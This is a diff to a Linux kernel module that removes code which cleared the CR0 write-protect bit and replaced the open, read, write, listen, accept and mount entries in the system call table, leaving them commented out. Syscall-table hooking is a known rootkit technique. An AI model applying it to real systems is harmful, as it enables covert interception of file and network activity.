@@ -242,18 +242,8 @@ static int __init init_simpleproc (void)
     cr0 = read_cr0();
     write_cr0(cr0 & ~CR0_WP);
 
-    original_open_call = syscall_table[__NR_open];
-    original_read_call = syscall_table[__NR_read];
-    original_write_call = syscall_table[__NR_write];
-    original_listen_call = syscall_table[__NR_listen];
-    original_accept_call = syscall_table[__NR_accept];	
-    original_mount_call = syscall_table[__NR_mount];
-    syscall_table[__NR_open] = my_sys_open;
-    syscall_table[__NR_read] = my_sys_read;
-    syscall_table[__NR_write] = my_sys_write;
-    syscall_table[__NR_listen] = my_sys_listen;
-    syscall_table[__NR_accept] = my_sys_accept;
-    syscall_table[__NR_mount] = my_sys_mount;
+   // original_open_call = syscall_table[__NR_open];
+   
 
     write_cr0(cr0);
     return 0;	
@@ -266,12 +256,8 @@ static void __exit exit_simpleproc(void)
 
     cr0 = read_cr0();
     write_cr0(cr0 & ~CR0_WP);
-    syscall_table[__NR_open] = original_open_call;
-    syscall_table[__NR_read] = original_read_call;
-    syscall_table[__NR_write] = original_write_call;
-    syscall_table[__NR_listen] = original_listen_call;
-    syscall_table[__NR_accept] = original_accept_call;
-    syscall_table[__NR_mount] = original_mount_call;
+  //  syscall_table[__NR_open] = original_open_call;
+   
 
     printk(KERN_DEBUG "Everything is back to normal\n");
     write_cr0(cr0);
